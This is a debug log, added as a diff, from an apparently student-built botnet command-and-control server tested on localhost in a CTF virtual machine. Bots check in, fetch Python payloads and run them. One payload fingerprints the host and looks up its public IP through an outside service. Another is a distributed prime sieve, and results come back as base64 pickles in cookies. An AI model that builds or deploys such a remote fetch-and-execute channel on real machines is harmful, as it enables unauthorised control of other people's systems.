+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /YOEWDRPV HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+INFO:root:Bot: YOEWDRPV;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:15 2016
+INFO:root:Bot: HFQMLMZ8;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:23:17 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /HFQMLMZ8 HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: K5LNDZUX
+DEBUG:root:Targets: 2
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+INFO:root:Starting main.
+DEBUG:root:Before Server Process
+INFO:root:Started server process
+INFO:root:Connecting to GUI 
+INFO:root:Connected to GUI 
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending 
+
+DEBUG:root:In Server process
+INFO:root:Listening on port: 80
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:34:10
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+IL3KNVPX;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: IL3KNVPX;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjM0OjEwIDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET / HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Creating new bot
+DEBUG:root:Sending: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:34:13
+Server: Apache
+Content-Length: 412
+Connection: close
+Content-Type:text/html
+4X2R26LJ;388;getInfo.py;import os
+import platform
+import cPickle
+import urllib2
+import time
+
+def execute():
+    fqn = os.uname()[1]
+    machine = platform.machine()
+    OS = os.name + " " + platform.system() + " " + platform.release()
+    try:
+        ip = urllib2.urlopen('http://ip.42.pl/raw').read()
+    except:
+        ip = ''
+    t = time.strftime('%c')
+    info = [fqn, OS, machine, ip, t]
+    return info
+
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;;;;;;0;
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpTJ3VidW50dS1jdGYnCnAyCmFTJ3Bvc2l4IExpbnV4IDQuNC4wLTUxLWdlbmVyaWMnCnAzCmFTJ3g4Nl82NCcKcDQKYVMnJwphUydGcmkgRGVjICA5IDE4OjM0OjEzIDIwMTYnCnA1CmEu _src=getInfo.py 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending IL3KNVPX  posix Linux 4.4.0-51-generic x86_64:4X2R26LJ  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending IL3KNVPX  posix Linux 4.4.0-51-generic x86_64:4X2R26LJ  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Command is: $GS$
+INFO:root:Before split $GS$
+INFO:root:Split command: GS
+INFO:root:Returning list of bots.
+INFO:root:Sending IL3KNVPX  posix Linux 4.4.0-51-generic x86_64:4X2R26LJ  posix Linux 4.4.0-51-generic x86_64:
+
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Command is: $UP$IL3KNVPX:4X2R26LJ$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Before split $UP$IL3KNVPX:4X2R26LJ$/home/shawn/actualbotnet/botnetproject/SievePayload.py
+INFO:root:Split command: UP
+DEBUG:root:Adding payload: HAJHHGM8
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: HAJHHGM8
+DEBUG:root:Targets: 2
+DEBUG:root:Is in HAJHHGM8
+DEBUG:root:Payload selected: HAJHHGM8
+DEBUG:root:tempcommand = ['IL3KNVPX', '4X2R26LJ']
+DEBUG:root:botindex1 0
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:34:56
+Server: Apache
+Content-Length: 1436
+Connection: close
+Content-Type:text/html
+1422;HAJHHGM8;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 0
+thigh = 49
+
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJMAphSTEKYUkyCmFJMwphSTUKYUk3CmFJMTEKYUkxMwphSTE3CmFJMTkKYUkyMwphSTI5CmFJMzEKYUkzNwphSTQxCmFJNDMKYUk0NwphLg== _src=HAJHHGM8 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Checking if is target
+DEBUG:root:Checking payload: HAJHHGM8
+DEBUG:root:Targets: 2
+DEBUG:root:Is in HAJHHGM8
+DEBUG:root:Payload selected: HAJHHGM8
+DEBUG:root:tempcommand = ['IL3KNVPX', '4X2R26LJ']
+DEBUG:root:botindex1 50
+DEBUG:root:Sending Response: 1.1 200 OK
+Date: Fri, 09 Dec 2016 18:34:58
+Server: Apache
+Content-Length: 1437
+Connection: close
+Content-Type:text/html
+1423;HAJHHGM8;#Sieve payload, XYZ12
+
+import math
+
+
+
+global DistSieveTarget
+
+global n
+
+global tlow
+
+global thigh
+
+global math
+
+
+
+def DistSieveTarget((n, tlow, thigh), B=None):
+
+    #sieve for use in threads of DistributedSieve
+
+    #n == number to sieve
+
+    #B == list of primes used to sieve
+
+    #A == partition we want to sieve
+
+    #tindex = first number A represents
+
+    print tlow, thigh
+
+    list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
+
+
+
+    list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
+
+
+
+    outerlimit = math.sqrt(n)
+
+    i = 2
+
+    
+
+    while i <= outerlimit:
+
+        if list1[i]:
+
+            p = i ** 2
+
+            while p <= n:
+
+                list1[p] = False
+
+                p += i
+
+                
+
+            q = i ** 2
+
+            while q <= thigh:
+
+                if q < tlow:
+
+                    q += i
+
+                    continue
+
+                try:
+
+                    list2[q-tlow] = False
+
+                except:
+
+                    print tlow, thigh
+
+                    print q-tlow
+
+                    print list2
+
+                    print thigh-tlow+1
+
+                    raise IndexError
+
+                q += i
+
+        i += 1
+
+
+
+    C = [val+tlow for val, j in enumerate(list2) if j]
+
+
+
+    return C
+
+
+
+
+
+def execute():
+
+    return DistSieveTarget((n, tlow, thigh))
+
+
+
+n = 101
+
+tlow = 2
+
+thigh = 101
+
+tlow = 50
+thigh = 99
+
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 1
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ/r/ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Cookie: _res=KGxwMQpJNTMKYUk1OQphSTYxCmFJNjcKYUk3MQphSTczCmFJNzkKYUk4MwphSTg5CmFJOTcKYS4= _src=HAJHHGM8 
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+DEBUG:root:Writing to file
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /IL3KNVPX HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
+INFO:root:Bot: IL3KNVPX;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:10 2016
+INFO:root:Bot: 4X2R26LJ;ubuntu-ctf;x86_64;posix Linux 4.4.0-51-generic;;;0;Fri Dec  9 18:34:13 2016
+DEBUG:root:Server while loop
+DEBUG:root:Payload Queue size: 0
+DEBUG:root:Accepted connection.
+DEBUG:root:GET /4X2R26LJ HTTP/1.1
+Accept-Encoding: identity
+Host: localhost:80
+Connection: close
+User-Agent: Mozilla/5.0 (X11)
